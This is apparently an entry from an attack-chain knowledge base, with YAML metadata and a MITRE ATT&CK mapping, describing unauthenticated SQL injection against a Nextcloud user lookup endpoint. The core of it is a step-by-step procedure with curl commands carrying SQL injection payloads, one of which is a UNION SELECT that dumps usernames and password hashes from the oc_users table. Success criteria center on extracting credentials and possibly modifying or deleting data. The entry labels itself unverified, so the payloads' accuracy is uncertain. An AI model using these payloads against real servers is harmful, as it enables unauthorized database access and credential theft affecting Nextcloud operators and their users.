---
id: ac-nextcloud-sqli-unauth
tags:
  - sqli
  - nextcloud
  - unauthenticated
  - data-exfiltration
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - >-
    [[procedures/Exploit-Unauthenticated-SQL-Injection-in-Nextcloud-User-Lookup]]
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.941Z'
description: >-
  An unauthenticated attacker exploits an SQL injection vulnerability in
  Nextcloud's user lookup server to execute arbitrary SQL commands, potentially
  leading to full data compromise.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Unauthenticated SQL Injection in Nextcloud User Lookup Server

Multi-stage attack chain demonstrating a complete attack workflow targeting a critical SQL injection vulnerability in Nextcloud's user lookup server, allowing unauthenticated arbitrary SQL execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via SQLi] --> B[Arbitrary SQL Execution]
    B --> C[Data Exfiltration or Modification]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (can be performed with standard HTTP clients like curl)

### Target Environment

- Nextcloud instance (PHP-based)
- MySQL database backend
- Web platform with user lookup endpoint exposed

### Initial Access Requirements

- No credentials required (unauthenticated)
- Network access to the Nextcloud server
- No prior access needed

## Detailed Attack Procedures

### Step 1: Exploit SQL Injection
procedure: [[procedures/Exploit-Unauthenticated-SQL-Injection-in-Nextcloud-User-Lookup]]

**Objective**: Inject malicious SQL payloads into the user lookup query to execute arbitrary SQL commands, enabling data extraction, modification, or deletion.

**Instructions**: As an unauthenticated user, send a crafted HTTP request to the user lookup endpoint with an SQL injection payload in the search parameter. For example, use [[commands/curl-sqli-payload]] to test for injection:

```bash
curl -X GET "https://target-nextcloud.com/ocs/v2.php/cloud/users?search=' OR 1=1--" -H "OCS-APIRequest: true" -H "Accept: application/json"
```

If vulnerable, escalate to arbitrary SQL execution, such as dumping user tables with [[commands/curl-sqli-dump]]:

```bash
curl -X GET "https://target-nextcloud.com/ocs/v2.php/cloud/users?search=' UNION SELECT username,password FROM oc_users--" -H "OCS-APIRequest: true" -H "Accept: application/json"
```

**Expected Output**: JSON response containing injected data or database contents instead of normal user list.

**Success Indicators**:
- Response includes unexpected data (e.g., all users returned due to 'OR 1=1')
- Database errors or partial payload execution visible in response
- Successful extraction of sensitive data like usernames and hashed passwords

## Attack Chain Summary

### Key Achievements

1. Gain unauthenticated access to execute arbitrary SQL on the Nextcloud database
2. Extract sensitive user data, including credentials
3. Potential for data modification or deletion, leading to full compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
